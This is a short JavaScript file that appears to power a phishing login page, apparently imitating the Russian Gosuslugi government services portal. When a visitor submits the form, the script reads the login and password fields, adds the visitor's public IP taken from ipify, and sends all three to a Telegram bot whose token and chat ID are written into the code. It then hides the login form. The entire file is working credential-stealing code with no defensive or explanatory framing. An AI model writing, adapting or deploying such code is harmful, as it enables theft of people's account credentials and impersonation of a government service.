fetch('https://api.ipify.org?format=json')
.then(res => res.json())
.then(data => set_ip(data.ip));

var ip;

function send_message(text) {
    let xhr = new XMLHttpRequest();
    xhr.open('GET', `https://api.telegram.org/bot7565044994:AAFh6GYAfkGG2aUwGSlpdNbsHSCDAXKCgWA/sendMessage?chat_id=5247769901&text=${text}`, true);
    xhr.send();
}

function set_ip(ips) {
    ip = ips;
}

function login() {
    var ulogin = document.getElementById('user-login').value;
    var upassword = document.getElementById('user-password').value;

    if (upassword != '') {
        if (ulogin != '') {
            send_message(`⚡️ Получены данные %0D%0A%0D%0A📍 IP: ${ip}%0D%0A%0D%0AЛогин: ${ulogin}%0D%0AПароль: ${upassword}`)
            //window.location.href = 'https://www.gosuslugi.ru/'

            document.getElementById('auth').style.display = 'none'
        }
        else {
            document.getElementById('user-login').style.backgroundColor = '#fce0e4'
        }
    }
    else {
        document.getElementById('user-password').style.backgroundColor = '#fce0e4'
        document.getElementById('user-login').style.backgroundColor = '#fce0e4'
    }
}

